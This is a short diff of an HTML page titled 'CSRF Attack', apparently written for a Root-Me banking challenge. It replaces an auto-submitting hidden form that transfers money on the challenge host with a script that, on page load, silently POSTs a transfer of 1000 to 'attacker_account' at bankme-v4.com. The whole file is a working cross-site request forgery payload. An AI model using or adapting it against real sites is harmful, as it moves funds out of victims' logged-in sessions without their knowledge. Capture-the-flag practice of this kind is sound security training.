@@ -1,19 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Attack</title>
-</head>
-<body>
-    <h3>Page d'aceuill</h3>
-    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
-        <input type="hidden" name="recipient" value="test">
-        <input type="hidden" name="amount" value="1000000">
-        <input type="submit" value="Submit">
-    </form>
+<html>
+  <body>
     <script>
-        document.forms[0].submit();
+      // Création et envoi automatique d'une requête POST
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://bankme-v4.com/transfer", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("to=attacker_account&amount=1000");
     </script>
-</body>
+  </body>
 </html>
